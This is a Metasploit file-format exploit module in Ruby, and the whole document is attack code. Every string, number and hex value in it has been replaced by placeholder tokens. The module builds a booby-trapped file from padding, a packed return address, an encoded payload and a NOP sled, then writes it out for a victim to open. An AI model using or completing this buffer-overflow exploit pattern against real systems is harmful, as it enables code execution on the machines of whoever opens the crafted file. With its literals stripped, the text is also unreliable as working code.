require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = GoodRanking include Msf :: Exploit :: FILEFORMAT def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > <str> , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , ] , <str> = > { <str> = > <str> , } , <str> = > { <str> = > <int> , <str> = > <str> , <str> = > - <int> , } , <str> = > <str> , <str> = > [ [ <str> , { <str> = > <hex> } ] , [ <str> , { <str> = > <hex> } ] , ] , <str> = > false , <str> = > <str> , <str> = > <int> ) ) register_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) , ] , self . class ) end def exploit ty = <str> ty << <str> ty << <str> ty << <str> * <int> ty << <str> ty << <str> * <int> ty << <str> ty << <str> * <int> ty << [ target . ret ] . pack ( <str> ) + payload . encoded + make_nops ( <int> ) ty << <str> * ( <int> - <int> - payload . encoded . length - <int> ) ty << <str> ty << <str> * <int> ty << <str> ty << <str> * <int> ty << <str> ty << <str> ty << <str> * <int> ty << <str> ty << <str> ty << <str> * <int> print_status ( <str> datastore [ <str> ] <str> ) file_create ( ty ) end end 
